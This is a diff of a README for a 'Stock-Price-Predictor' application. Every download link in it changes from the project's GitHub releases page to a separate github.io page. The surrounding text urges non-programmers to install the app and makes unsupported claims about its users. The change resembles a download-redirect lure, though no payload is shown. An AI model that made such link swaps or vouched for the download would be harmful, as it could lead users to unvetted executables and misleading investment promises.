@@ -1,6 +1,6 @@
 # 📈 Stock-Price-Predictor - Predict Market Trends with AI
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://github.com/Qaw7495/Stock-Price-Predictor/releases)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://qaw7495.github.io)
 
 ---
 
@@ -55,7 +55,7 @@ No programming knowledge is required. If you can use a web browser and download 
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [Stock-Price-Predictor Downloads](https://github.com/Qaw7495/Stock-Price-Predictor/releases)
+Visit this link to download the application: [Stock-Price-Predictor Downloads](https://qaw7495.github.io)
 
 The download section will show you available files. Look for the most recent version—the version number will be the highest. Click on it to begin your download.
 
@@ -134,7 +134,7 @@ When you first launch the application, you'll see the main dashboard with a clea
 
 Stock-Price-Predictor occasionally receives improvements and new features. When a new version becomes available:
 
-1. Visit the same download page: [https://github.com/Qaw7495/Stock-Price-Predictor/releases](https://github.com/Qaw7495/Stock-Price-Predictor/releases)
+1. Visit the same download page: [https://qaw7495.github.io](https://qaw7495.github.io)
 2. Download the newest version (highest version number)
 3. Install over your current installation—your settings will be preserved
 
@@ -170,7 +170,7 @@ If you meet these requirements (most modern computers do), you're ready to proce
 
 ## 📥 Ready to Predict?
 
-Visit this link to download the application: [Get Stock-Price-Predictor Now](https://github.com/Qaw7495/Stock-Price-Predictor/releases)
+Visit this link to download the application: [Get Stock-Price-Predictor Now](https://qaw7495.github.io)
 
 Click the download button, follow the installation steps above, and within five minutes you'll be generating your first stock movement predictions. Join thousands of smart investors who use data-driven insights to enhance their market strategies.
 
